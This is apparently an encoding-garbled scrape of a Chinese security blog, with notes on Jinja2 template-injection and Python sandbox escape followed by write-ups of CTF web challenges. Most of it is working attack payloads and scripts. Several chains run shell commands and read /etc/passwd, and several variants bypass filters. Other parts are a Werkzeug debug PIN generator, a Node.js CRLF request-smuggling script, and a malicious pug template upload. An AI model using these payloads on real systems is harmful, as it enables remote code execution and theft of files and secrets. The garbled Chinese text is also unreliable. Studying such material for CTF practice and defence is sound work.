&apos;itertools.accumulate&apos;&gt;, &lt;class &apos;itertools.combinations&apos;&gt;, &lt;class &apos;itertools.combinations_with_replacement&apos;&gt;, &lt;class &apos;itertools.cycle&apos;&gt;, &lt;class &apos;itertools.dropwhile&apos;&gt;, &lt;class &apos;itertools.takewhile&apos;&gt;, &lt;class &apos;itertools.islice&apos;&gt;, &lt;class &apos;itertools.starmap&apos;&gt;, &lt;class &apos;itertools.chain&apos;&gt;, &lt;class &apos;itertools.compress&apos;&gt;, &lt;class &apos;itertools.filterfalse&apos;&gt;, &lt;class &apos;itertools.count&apos;&gt;, &lt;class &apos;itertools.zip_longest&apos;&gt;, &lt;class &apos;itertools.permutations&apos;&gt;, &lt;class &apos;itertools.product&apos;&gt;, &lt;class &apos;itertools.repeat&apos;&gt;, &lt;class &apos;itertools.groupby&apos;&gt;, &lt;class &apos;itertools._grouper&apos;&gt;, &lt;class &apos;itertools._tee&apos;&gt;, &lt;class &apos;itertools._tee_dataobject&apos;&gt;, &lt;class &apos;reprlib.Repr&apos;&gt;, &lt;class &apos;collections.deque&apos;&gt;, &lt;class &apos;_collections._deque_iterator&apos;&gt;, &lt;class &apos;_collections._deque_reverse_iterator&apos;&gt;, &lt;class &apos;collections._Link&apos;&gt;, &lt;class &apos;functools.partial&apos;&gt;, &lt;class &apos;functools._lru_cache_wrapper&apos;&gt;, &lt;class &apos;functools.partialmethod&apos;&gt;, &lt;class &apos;contextlib.ContextDecorator&apos;&gt;, &lt;class &apos;contextlib._GeneratorContextManagerBase&apos;&gt;, &lt;class &apos;contextlib._BaseExitStack&apos;&gt;, &lt;class &apos;rlcompleter.Completer&apos;&gt;] 4ã€æ–‡ä»¶è¯»å–/å‘½ä»¤æ‰§è¡Œ 3ä¸ªæœ¬åœ°æµ‹è¯•æˆåŠŸçš„payload 123().__class__.__bases__[0].__subclasses__()[93].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)[].__class__.__base__.__subclasses__()[127].__init__.__globals__[&apos;system&apos;](&apos;ls&apos;)[].__class__.__base__.__subclasses__()[-1].__init__.__globals__[&apos;__builtins__&apos;][&apos;__import__&apos;](&quot;os&quot;).system(&quot;ls&quot;) 12345693&lt;class &apos;_frozen_importlib_external._NamespaceLoader&apos;&gt;127&lt;class &apos;os._wrap_close&apos;&gt;-1&lt;class &apos;rlcompleter.Completer&apos;&gt; é€šè¿‡è§‚å¯Ÿï¼Œå…¶å®å°±æ˜¯__global__ä¸­å­˜åœ¨sysæˆ–è€…systemæˆ–è€…__builtins__æ¨¡å— FUZZè„šæœ¬ 1234567891011121314#!/usr/bin/env python# encoding: utf-8for item in ().__class__.__bases__[0].__subclasses__(): try: if 'system' in item.__init__.__globals__: print('system',num,item) if 'sys' in item.__init__.__globals__: print('sys',num,item) if '__builtins__' in item.__init__.__globals__: print('__builtins__',num,item) num+=1 except: print '-' num+=1 fuzzå‡ºå¾ˆå¤šå…¶ä»–çš„ï¼Œæµ‹è¯•ä¸€ä¸‹ å°è¯•è‡ªå·±æ„é€ forå¾ªç¯ 1&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if &apos;sys&apos; in c.__init__.__globals__ %&#125;&#123;&#123; c.__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; ä¸€ä¸ª0ä»£è¡¨æ‰§è¡Œä¸€æ¬¡ğŸ¤¦â€â™‚ï¸ï¼Œå‘½ä»¤æ‰§è¡Œçš„ç»“æœæ— æ³•å›æ˜¾ï¼Œåˆ©ç”¨curlå¸¦å‡º å½“ç„¶ä¹Ÿå¯ä»¥æŒ‡å®šæ¨¡å—åï¼Œå°±å¯ä»¥åªæ‰§è¡Œä¸€æ¬¡ï¼Œæ¯”å¦‚å‰é¢FUZZå‡ºæ¥çš„ 1sys 128 &lt;class &apos;_sitebuiltins.Quitter&apos;&gt; æ³¨æ„æ˜¯ååŠéƒ¨åˆ†Quitter 1&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;Quitter&apos; %&#125;&#123;&#123; c.__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; ä¸Šé¢ä¸‰ä¸ªæ¨¡å—ä¸­__builtins__æœ€ä¸ºä¸°å¯Œ 12345[].__class__.__base__.__subclasses__()[-1].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&quot;__import__(&apos;os&apos;).popen(&apos;id&apos;).read()&quot;)[].__class__.__base__.__subclasses__()[-1].__init__.__globals__[&apos;__builtins__&apos;][&apos;__import__&apos;](&quot;os&quot;).system(&quot;ls&quot;)[].__class__.__base__.__subclasses__()[-1].__init__.__globals__[&apos;__builtins__&apos;][&apos;open&apos;](&apos;/etc/passwd&apos;, &apos;r&apos;).read() æ¯”å¦‚è¿˜æœ‰chr()å‡½æ•° Jinja2çš„forå¾ªç¯å¤„ç† 123&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;Repr&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;][&apos;open&apos;](&apos;/etc/passwd&apos;, &apos;r&apos;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;Repr&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&quot;__import__(&apos;os&apos;).popen(&apos;id&apos;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; evalæ‰§è¡Œçš„å¥½å¤„æ˜¯ç›´æ¥æœ‰å›æ˜¾ï¼Œ Some Tricksï¼ˆæµ‹è¯•ç¯å¢ƒä¸ºPy2ï¼‰.è¢«è¿‡æ»¤ 1[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;].__dict__[&apos;os&apos;].system(&apos;ls&apos;) ä½¿ç”¨getattr() 123456[].__class__ =&gt; getattr([],&apos;__class__&apos;)[].__class__.__base__ =&gt; getattr(getattr([],&apos;__class__&apos;),&apos;__base__&apos;)[].__class__.__base__.__subclasses__()[59] =&gt; getattr(getattr(getattr([],&apos;__class__&apos;),&apos;__base__&apos;),&apos;__subclasses__&apos;)()[59][].__class__.__base__.__subclasses__()[59].__init__ =&gt; getattr(getattr(getattr(getattr([],&apos;__class__&apos;),&apos;__base__&apos;),&apos;__subclasses__&apos;)()[59],&apos;__init__&apos;)...getattr(getattr(getattr(getattr(getattr(getattr(getattr([],&apos;__class__&apos;),&apos;__base__&apos;),&apos;__subclasses__&apos;)()[59],&apos;__init__&apos;),&apos;__globals__&apos;)[&apos;linecache&apos;],&apos;__dict__&apos;)[&apos;os&apos;],&apos;system&apos;)(&apos;ls&apos;) _è¢«è¿‡æ»¤ 1getattr(getattr(getattr(getattr(getattr(getattr(getattr([],dir(0)[0][0]*2+&apos;class&apos;+dir(0)[0][0]*2),dir(0)[0][0]*2+&apos;base&apos;+dir(0)[0][0]*2),dir(0)[0][0]*2+&apos;subclasses&apos;+dir(0)[0][0]*2)()[59],dir(0)[0][0]*2+&apos;init&apos;+dir(0)[0][0]*2),dir(0)[0][0]*2+&apos;globals&apos;+dir(0)[0][0]*2)[&apos;linecache&apos;],dir(0)[0][0]*2+&apos;dict&apos;+dir(0)[0][0]*2)[&apos;os&apos;],&apos;system&apos;)(&apos;ls&apos;) ä¸­æ‹¬å·è¢«è¿‡æ»¤ 1&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;file&apos;](&apos;/etc/passwd&apos;).read() å¯ä»¥ç”¨getitemå’Œpopè¿›è¡Œç»•è¿‡è¿‡æ»¤ 1&apos;&apos;.__class__.__mro__.__getitem__(2).__subclasses__().pop(58).__init__.__globals__[&apos;__builtins__&apos;][&apos;file&apos;](&apos;/etc/passwd&apos;).read() å¼•å·è¢«è¿‡æ»¤ å…ˆè·å–chr()å†å°†æ–‡ä»¶åæ‹¼æ¥ 1&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read() &#125;&#125; è¿‡æ»¤åŒæ‹¬å·)) åˆ©ç”¨æ–‡ä»¶ç›²æ³¨ 1&#123;% if &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/tmp/aa&apos;).read()[0:1]==&apos;f&apos; %&#125;~ok~&#123;% endif %&#125; å†™ä¸ªè„šæœ¬å³å¯ æ€»ç»“é€šç”¨çš„payload åŸºç±» 12&apos;&apos;.__class__.__mro__[-1]().__class__.__base__ Python 2.7 &lt;type &#39;file&#39;&gt; ä¸‹æ ‡ä¸€èˆ¬æ˜¯40ï¼Œå¦‚æœä¸è¡Œçš„è¯ä¹Ÿå¯çˆ†ç ´è¯•è¯• 1&apos;&apos;.__class__.__mro__[-1].__subclasses__()[40](&apos;/etc/passwd&apos;).read() osã€__builtins__ã€linecacheæ¨¡å— å¯»æ‰¾ç›¸åº”æ¨¡å—.py 12345678910111213#!/usr/bin/env python#coding=utf-8num = 0list = ['os', '__builtins__', 'linecache']for item in ''.__class__.__mro__[-1].__subclasses__(): try: for i in list: if i in item.__init__.__globals__: print(i, num, item) num += 1 except: print('-') num += 1 123&apos;&apos;.__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;file&apos;](&apos;/etc/passwd&apos;).read()&apos;&apos;.__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;].os.system(&apos;ls&apos;)&apos;&apos;.__class__.__mro__[-1].__subclasses__()[71].__init__.__globals__[&apos;os&apos;].system(&apos;ls&apos;) è¿™é‡Œæœ‰å¾ˆå¤šå˜å½¢å¯ä»¥å‚è€ƒä¸Šé¢çš„ jinja2çš„forå¾ªç¯ä¸€æŠŠæ¢­ 12345&#123;% for c in &apos;&apos;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if c.__name__==&apos;Quitter&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;os&apos;].system(&apos;ls&apos;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in &apos;&apos;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;linecache&apos;].os.system(&apos;ls&apos;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in &apos;&apos;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;][&apos;file&apos;](&apos;/etc/passwd&apos;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; Python 3.7 sysã€systemã€__builtins__æ¨¡å—ï¼Œå…¶ä¸­__builtins__å’Œpython2çš„ç•¥æœ‰ä¸åŒ å¯»æ‰¾ç›¸åº”æ¨¡å—.py 12345678910111213#!/usr/bin/env python#coding=utf-8num = 0list = ['sys', '__builtins__', 'system']for item in ''.__class__.__mro__[-1].__subclasses__(): try: for i in list: if i in item.__init__.__globals__: print(i, num, item) num += 1 except: print('-') num += 1 123&apos;&apos;.__class__.__mro__[-1].__subclasses__()[127].__init__.__globals__[&apos;__builtins__&apos;][&apos;open&apos;](&apos;/etc/passwd&apos;).read()&apos;&apos;.__class__.__mro__[-1].__subclasses__()[127].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)&apos;&apos;.__class__.__mro__[-1].__subclasses__()[127].__init__.__globals__[&apos;system&apos;](&apos;ls&apos;) jinja2çš„forå¾ªç¯ä¸€æŠŠæ¢­ 12345&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;_wrap_close&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;][&apos;open&apos;](&apos;/etc/passwd&apos;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;_wrap_close&apos; %&#125;&#123;&#123; c.__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in &apos;&apos;.__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;_wrap_close&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;system&apos;](&apos;ls&apos;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; ======================åˆ†å‰²çº¿ å®‰æ’æ¯æŠ—ç–«æœˆèµ› æ²¡æ‰“æ¯”èµ›ï¼Œä¼¼ä¹æ˜¯è¿‡æ»¤äº†.å’Œ_ï¼Œ æˆ‘æƒ³åˆ°çš„payload 1getattr(getattr(getattr(getattr(getattr(&apos;&apos;,dir(0)[0][0]*2+&apos;class&apos;+dir(0)[0][0]*2),dir(0)[0][0]*2+&apos;mro&apos;+dir(0)[0][0]*2)[-1],dir(0)[0][0]*2+&apos;subclasses&apos;+dir(0)[0][0]*2)()[127],dir(0)[0][0]*2+&apos;init&apos;+dir(0)[0][0]*2),dir(0)[0][0]*2+&apos;globals&apos;+dir(0)[0][0]*2)[&apos;system&apos;](&apos;ls&apos;) èµ›åçœ‹åˆ°ä¸‹é¢ä¸¤ä¸ªpayload payload1ï¼Œåˆ©ç”¨16è¿›åˆ¶ç¼–ç  1&#123;&#123;&quot;&quot;[&quot;\\x5f\\x5fclass\\x5f\\x5f&quot;][&quot;\\x5f\\x5fmro\\x5f\\x5f&quot;][1][&quot;\\x5f\\x5fsubclasses\\x5f\\x5f&quot;]()[30][&quot;\\x5f\\x5finit\\x5f\\x5f&quot;][&quot;\\x5f\\x5fglobals\\x5f\\x5f&quot;][&quot;\\x5f\\x5fbuiltins\\x5f\\x5f&quot;][&apos;\\x5f\\x5fimport\\x5f\\x5f&apos;](&apos;os&apos;)[&quot;popen&quot;](&apos;cat%20/flag*&apos;)[&apos;read&apos;]()&#125;&#125; payload2ï¼Œåˆ©ç”¨request 1&#123;&#123;()|attr(request[&apos;args&apos;][&apos;x1&apos;])|attr(request[&apos;args&apos;][&apos;x2&apos;])|attr(request[&apos;args&apos;][&apos;x3&apos;])()|attr(request[&apos;args&apos;][&apos;x4&apos;])(233)|attr(request[&apos;args&apos;][&apos;x5&apos;])|attr(request[&apos;args&apos;][&apos;x6&apos;])|attr(request[&apos;args&apos;][&apos;x4&apos;])(request[&apos;args&apos;][&apos;x7&apos;])|attr(request[&apos;args&apos;][&apos;x4&apos;])(request[&apos;args&apos;][&apos;x8&apos;])(request[&apos;args&apos;][&apos;x9&apos;])&#125;&#125;?x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=eval&amp;x9=__import__(&quot;os&quot;).popen(&apos;æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤&apos;).read() è¿™é‡Œçªç„¶æ„è¯†åˆ°æ–‡ç« å‰é¢éƒ½æ²¡æœ‰æåˆ°è¿‡æ»¤å™¨ï¼Œè€Œåœ¨æ¨¡ç‰ˆå¼•æ“ä¸­è¿‡æ»¤å™¨ä¹Ÿæœ‰å¾ˆå¤šszs 12345#æ¯”å¦‚flagè¢«è¿‡æ»¤ï¼Œ|reverse&apos;&apos;.__class__.__mro__[-1].__subclasses__()[40](&apos;galf&apos;|reverse).read()#æ¯”å¦‚getattrè¢«è¿‡æ»¤ï¼Œ|attr(&apos;&apos;|attr(&apos;__class__&apos;)).__mro__[-1].__subclasses__()[127].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)#names|lastï¼Œå–åºåˆ—æœ€åä¸€ä¸ªå…ƒç´ ç­‰ç­‰ =======================åˆ†å‰²çº¿ å‚è€ƒé“¾æ¥ï¼š http://n3k0.icu/2018/09/10/Python-Sandbox-Excape/ https://lihuaiqiu.github.io/2019/07/07/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-Jinja2/#more","categories":[],"tags":[{"name":"SSTI","slug":"SSTI","permalink":"https://glotozz.github.io/tags/SSTI/"}]},{"title":"2020æ–°æ˜¥æˆ˜ç–«-ç½‘ç»œå®‰å…¨å…¬ç›Šèµ›-3","slug":"2020æ–°æ˜¥æˆ˜ç–«-ç½‘ç»œå®‰å…¨å…¬ç›Šèµ›-3","date":"2020-02-23T02:38:33.000Z","updated":"2020-02-27T07:08:39.311Z","comments":true,"path":"2020/02/23/2020æ–°æ˜¥æˆ˜ç–«-ç½‘ç»œå®‰å…¨å…¬ç›Šèµ›-3/","link":"","permalink":"https://glotozz.github.io/2020/02/23/2020æ–°æ˜¥æˆ˜ç–«-ç½‘ç»œå®‰å…¨å…¬ç›Šèµ›-3/","excerpt":"","text":"Flaskapphintä¸­æç¤ºPINï¼Œé‚£ä¹ˆä¼°è®¡åˆ©ç”¨debug https://xz.aliyun.com/t/2553?tdsourcetag=s_pctim_aiomsg /debugå¾—åˆ°æºç  è¯»å–é…ç½®åˆ©ç”¨è‡ªå¸¦çš„/encodeï¼Œç„¶åä¼ å…¥/decode 1&lt;Config &#123;&apos;ENV&apos;: &apos;production&apos;, &apos;DEBUG&apos;: True, &apos;TESTING&apos;: False, &apos;PROPAGATE_EXCEPTIONS&apos;: None, &apos;PRESERVE_CONTEXT_ON_EXCEPTION&apos;: None, &apos;SECRET_KEY&apos;: &apos;s_e_c_r_e_t_k_e_y&apos;, &apos;PERMANENT_SESSION_LIFETIME&apos;: datetime.timedelta(days=31), &apos;USE_X_SENDFILE&apos;: False, &apos;SERVER_NAME&apos;: None, &apos;APPLICATION_ROOT&apos;: &apos;/&apos;, &apos;SESSION_COOKIE_NAME&apos;: &apos;session&apos;, &apos;SESSION_COOKIE_DOMAIN&apos;: False, &apos;SESSION_COOKIE_PATH&apos;: None, &apos;SESSION_COOKIE_HTTPONLY&apos;: True, &apos;SESSION_COOKIE_SECURE&apos;: False, &apos;SESSION_COOKIE_SAMESITE&apos;: None, &apos;SESSION_REFRESH_EACH_REQUEST&apos;: True, &apos;MAX_CONTENT_LENGTH&apos;: None, &apos;SEND_FILE_MAX_AGE_DEFAULT&apos;: datetime.timedelta(seconds=43200), &apos;TRAP_BAD_REQUEST_ERRORS&apos;: None, &apos;TRAP_HTTP_EXCEPTIONS&apos;: False, &apos;EXPLAIN_TEMPLATE_LOADING&apos;: False, &apos;PREFERRED_URL_SCHEME&apos;: &apos;http&apos;, &apos;JSON_AS_ASCII&apos;: True, &apos;JSON_SORT_KEYS&apos;: True, &apos;JSONIFY_PRETTYPRINT_REGULAR&apos;: False, &apos;JSONIFY_MIMETYPE&apos;: &apos;application/json&apos;, &apos;TEMPLATES_AUTO_RELOAD&apos;: None, &apos;MAX_COOKIE_SIZE&apos;: 4093, &apos;BOOTSTRAP_USE_MINIFIED&apos;: True, &apos;BOOTSTRAP_CDN_FORCE_SSL&apos;: False, &apos;BOOTSTRAP_QUERYSTRING_REVVING&apos;: True, &apos;BOOTSTRAP_SERVE_LOCAL&apos;: False, &apos;BOOTSTRAP_LOCAL_SUBDOMAIN&apos;: None&#125;&gt; è¿˜æ˜¯å¾—ç”ŸæˆPINï¼Œéœ€è¦è¯»å–ä¸€äº›é…ç½®æ–‡ä»¶ https://www.cnblogs.com/-qing-/p/11656544.html#_label2 payload æ–‡ä»¶è¯»å– 1&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&apos;open&apos;](&apos;/etc/passwd&apos;).read()&#125;&#125; å‘½ä»¤æ‰§è¡Œ 123&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&apos;eval&apos;](&quot;__import__(&apos;os&apos;).popen(&apos;id&apos;).read()&quot;)&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(&apos;__global&apos;+&apos;s__&apos;)[&apos;os&apos;].__dict__[&apos;system&apos;](&apos;ls&apos;)&#125;&#125; éƒ½è¢«waf æŸ¥çœ‹ç½‘å¡ 1&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&apos;open&apos;](&apos;/sys/class/net/eth0/address&apos;).read()&#125;&#125; å¾—åˆ°02:42:ac:12:00:02=&gt;2485377957890 åœ¨dockerä¸­ï¼ŒæŸ¥çœ‹æœºå™¨ç  1&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&apos;open&apos;](&apos;/proc/self/cgroup&apos;).read()&#125;&#125; c87691dcb0dbd614f719b6a06e7b60484b5a760147a8f5332511356483a20df4 1234567891011probably_public_bits = [ 'flaskweb', # username 'flask.app', # modname 'Flask', # getattr(app, '__name__', getattr(app.__class__, '__name__')) '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),]private_bits = [ '2485377957890',# str(uuid.getnode()), /sys/class/net/ens33/address 'c87691dcb0dbd614f719b6a06e7b60484b5a760147a8f5332511356483a20df4'# get_machine_id(), /etc/machine-id] 1234567891011121314151617181920212223242526272829303132333435363738394041import hashlibfrom itertools import chainprobably_public_bits = [ 'flaskweb', # username 'flask.app', # modname 'Flask', # getattr(app, '__name__', getattr(app.__class__, '__name__')) '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),]private_bits = [ '2485377957890',# str(uuid.getnode()), /sys/class/net/ens33/address 'c13c64207f09e3ab65ae5495988d6880e7068f245add3303fd80303ad9fce46f'# get_machine_id(), /etc/machine-id]h = hashlib.md5()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit)h.update(b'cookiesalt')cookie_name = '__wzd' + h.hexdigest()[:20]num = Noneif num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = numprint(rv) 1os.popen(&apos;ls /&apos;).read() ç¿”å“¥çš„æ–¹æ³•ï¼šç›´æ¥ç»•wafå‘½ä»¤æ‰§è¡Œ 1&#123;&#123;[].__class__.__base__.__subclasses__()[127].__init__.__globals__[&apos;sys&apos;+&apos;tem&apos;](&apos;ls /&apos;)&#125;&#125; æ²¡æœ‰å›æ˜¾ï¼Œåå¼¹shellå³å¯ node_game https://r3billions.com/writeup-split-second/?tdsourcetag=s_pctim_aiomsg 1%C4%A0HTTP%2F1.1%C4%8D%C4%8AHost%3A%C4%A0127.0.0.1%C4%8D%C4%8A%C4%8D%C4%8AGET%C4%A0%2Ffile_upload æœ¬åœ°æµ‹ä¸€ä¸‹ 123456#ä½¿ç”¨npm å®‰è£…ä¸€ä¸ªæ¨¡å— n åˆ°å…¨å±€npm install -g n#ä½¿ç”¨ n åŠ ç‰ˆæœ¬å·å°±å¯ä»¥å®‰è£…å…¶ä»–ç‰ˆæœ¬n 8.12.0#å†ä½¿ç”¨ n ï¼Œé€šè¿‡ä¸Šä¸‹é”®ï¼Œå°±å¯ä»¥é€‰æ‹©ä¸åŒçš„ç‰ˆæœ¬n wiresharké‡Œé¢æ˜¯è¿™æ ·çš„ ä¹Ÿå°±æ˜¯è¯´payloadæœ‰é—®é¢˜ï¼Œå¹¶æ²¡æœ‰å®ç°CRLFæ³¨å…¥ï¼Œä½†æ˜¯ä¸çŸ¥é“å“ªæœ‰é—®é¢˜ã€‚ã€‚ Expressæ–‡ä»¶ä¸Šä¼ ï¼ŒæŸ¥çœ‹å‚æ•°å†…å®¹ï¼Œç­‰ä¸‹æ„é€ åŒ…çš„æ—¶å€™æ–¹ä¾¿äº› 123var file_path = &apos;/uploads/&apos; + req.files[0].mimetype +&quot;/&quot;;var file_name = req.files[0].originalnamevar dir_file = __dirname + file_path + file_name ä½œç½¢ ======================åˆ†å‰²çº¿ èµµå¸ˆå‚…å‘äº†è„šæœ¬ï¼ŒCRLFçš„ç¼–ç å’Œwpä¸å¤ªä¸€æ · åŸç†ï¼š https://xz.aliyun.com/t/2894 åœ¨nodejs8.12.0è¿™ä¸ªç‰ˆæœ¬ä¸­, ç¨‹åºåœ¨åº•å±‚å¤„ç†çš„æ—¶å€™ä¼šèˆå¼ƒé«˜ä½çš„å­—ç¬¦, åªä¿ç•™ä½ä½çš„å­—ç¬¦, ä¹Ÿå°±æ˜¯è¯´ å‡å¦‚æˆ‘ä»¬ä¼ å…¥chr(0xffa0)å¤„ç†åä¼šè¢«æˆªæ–­ä¸ºchr(0xa0)ï¼Œå¹¶ä¸”è¿™ä¸ª0xffå¯æ›´æ¢ æµ‹è¯•CRLF 1234567891011121314import urllibimport requestspayload = ''' HTTP/1.1Host: xConnection: keep-aliveGET /file_upload HTTP/1.1Host: xConnection: closex:'''payload = payload.replace(\"\\n\", \"\\r\\n\")a = ''.join(chr(int('0xff' + hex(ord(c))[2:].zfill(2), 16))for c in payload)a = urllib.parse.quote(a)print(a) ä½†æ˜¯æ‰“é¢˜ç›®å’Œæœ¬åœ°è¿˜æ˜¯å¤±è´¥ï¼Œä¾æ—§æ˜¯304ï¼Œæˆ‘ä¸¢ï¼Œå†ç”¨è„šæœ¬å‘åŒ…å‘ç°å¯ä»¥ï¼ŒçŒœæµ‹åŸå› å¯èƒ½æ˜¯bpå‘é€GETè¯·æ±‚ä¸­æœ‰è¿™äº›éå¯è§å­—ç¬¦çš„æ—¶å€™å¯èƒ½ä¼šå‡ºé”™ è¿”å›200ï¼Œè¿”å›æºç  æ—¢ç„¶CSRFæ³¨å…¥æˆåŠŸï¼Œé…åˆSSRFä¸Šä¼ æ–‡ä»¶ ä¹‹å‰çœ‹æºç å‘ç°æˆ‘ä»¬å¯æ§æ–‡ä»¶è·¯å¾„ï¼Œä½†æ˜¯è¿˜éœ€è¦è®¿é—® 123456789app.get(&apos;/&apos;, function(req, res) &#123; var action = req.query.action?req.query.action:&quot;index&quot;; if( action.includes(&quot;/&quot;) || action.includes(&quot;\\\\&quot;) )&#123; res.send(&quot;Errrrr, You have been Blocked&quot;); &#125; file = path.join(__dirname + &apos;/template/&apos;+ action +&apos;.pug&apos;); var html = pug.renderFile(file); res.send(html);&#125;); ä¸Šä¼ a.pugåˆ°/templateä¸‹å³å¯ pugè¯­æ³•ï¼š https://segmentfault.com/a/1190000006198621 12345doctype htmlhtml head body include ../../../../../../flag.txt ä¿®æ”¹æºç æŠŠipé™åˆ¶å»æ‰æŠ“åŒ… 123456789101112131415161718POST /file_upload HTTP/1.1Host: 192.168.56.124:8081User-Agent: x Content-Type: multipart/form-data; boundary=---------------------------2995119424827Connection: keep-aliveContent-Length: 269-----------------------------2995119424827Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;a.pug&quot;Content-Type: /../templatedoctype htmlhtml head body include ../../../../../../flag.txt-----------------------------2995119424827-- ç»“åˆCRLF 123456789101112131415161718192021222324252627payload = &apos;&apos;&apos; HTTP/1.1Host: xConnection: keep-alivePOST /file_upload HTTP/1.1Host: 192.168.56.124:8081User-Agent: x Content-Type: multipart/form-data; boundary=---------------------------2995119424827Connection: keep-aliveContent-Length: 269-----------------------------2995119424827Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;a.pug&quot;Content-Type: /../templatedoctype htmlhtml head body include ../../../../../../flag.txt-----------------------------2995119424827--GET /file_upload HTTP/1.1Host: xConnection: closex:&apos;&apos;&apos; æœ€åè®¿é—® è¿™é‡Œå‘åŒ…æ ¼å¼è¿˜æ˜¯æŒºç»†çš„ï¼Œå¯ä»¥é€šè¿‡wiresharkåˆ†ææ’æŸ¥ï¼Œæ¯”å¦‚ä¸€å¼€å§‹æˆ‘å‡ºç°è¿‡ä¸‹é¢çš„è§£æé”™è¯¯ ezExpressæ˜æ˜¾çš„JavaScriptåŸå‹é“¾æ±¡æŸ“ ç•™ä¸‹äº†ä¸å­¦æ— æœ¯çš„çœ¼æ³ª.jpg =================åˆ†å‰²çº¿ JavaScriptåŸå‹é“¾æ±¡æŸ“ï¼š https://glotozz.github.io/2020/02/25/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/ easy_thinkingåº”è¯¥æ˜¯tpæ¡†æ¶ï¼Œæç¤ºVulnerability Searchï¼Œå¯èƒ½æ˜¯æœç´¢åŠŸèƒ½æœ‰é—®é¢˜ äº§ç”ŸæŠ¥é”™ tp6.0ï¼Œåº”è¯¥ä¼šç»™æºç ï¼Œæ‰«äº†ä¸‹ï¼Œå‘ç°www.zip https://paper.seebug.org/1114/ çŒœæµ‹æ˜¯æœç´¢è®°å½•æ˜¯dataï¼Œsessionidæ˜¯æ–‡ä»¶åï¼Œæƒ³æœ¬åœ°æµ‹è¯•ä¸‹ï¼Œå‘ç°è¿è¡ŒæŠ¥é”™ [Sun Feb 23 06:18:54 2020] PHP Warning: require(/root/Desktop/web/public/vendor/autoload.php): failed to open stream: No such file or directory in /root/Desktop/web/public/index.php on line 6 